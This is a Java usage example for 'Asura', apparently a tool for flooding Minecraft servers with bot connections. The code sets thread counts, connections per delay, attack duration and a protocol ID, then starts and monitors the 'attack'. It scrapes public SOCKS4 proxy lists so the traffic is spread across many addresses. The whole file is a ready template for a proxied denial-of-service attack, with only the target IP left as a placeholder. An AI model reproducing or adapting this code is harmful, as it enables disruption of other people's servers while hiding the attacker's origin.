package test;

import dev.lastknell.core.NettyBootstrap;
import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.methods.impl.Join;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.core.proxy.ProxyManager;
import dev.lastknell.core.proxy.util.ProxyScraper;
import dev.lastknell.core.proxy.util.ProxyType;

import java.net.MalformedURLException;
import java.util.ArrayList;

import static java.lang.Thread.sleep;

public class AsuraExample {

    // how asura work
    /*
     * for each attack u make a new object of NettyBootstrap
     * then u make a proxy manager with a list of proxies to use in attack(Arraylist of dev.lastknell.Proxy)
     * proxy scraper helps u to scrape proxies and get ArrayList of dev.lastknell.Proxy from a ArrayList of urls(String)
     * use nettybootstrap start() method to start attack
     * and stop() method to stop attack
     */

    public static void main(String[] args) {
        String srvIP = "0.0.0.0";
        int port = 25565;
        IMethod method = new Join();
        // setup nettybootstrap
        NettyBootstrap bootstrap = new NettyBootstrap.Builder(method, srvIP, port)
                .connectLoopThreads(3)
                .workerThreads(256)
                .proxyType(ProxyType.SOCKS4)
                .delay(100) //in ms
                .perDelay(10) // connections per delay
                .duration(100) //attack duration
                .protocolID(760) //miecraft version protocol id
                .proxyManager(makeProxyManager()) //proxy manager
                .usingEpoll(true) // gives high performance in linux if true
                .build();

        // start attack
        bootstrap.start();

        // stop attack if u want anytime (before duration)
        bootstrap.stop();

        // u can print or use live updated values in bootstrap
        while (!bootstrap.shouldStop) {
            System.out.println(bootstrap.averageCPS);
            // sleep for 1000 sec as CPS updates every sec so no use to see its value
            // between a interval if sec
            try {
                sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    //a function to make ProxyManager
    public static ProxyManager makeProxyManager() {
        ArrayList<String> urls = new ArrayList<>();
        //now add all urls u want to scrape proxyes from in this list
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt");
        ArrayList<Proxy> proxies = new ArrayList<>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            // scrape proxies from links
            scraper.scrape();
            // get proxies
            proxies = new ArrayList<>(scraper.getProxies());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        // make proxy manager
        return new ProxyManager(proxies);
    }
}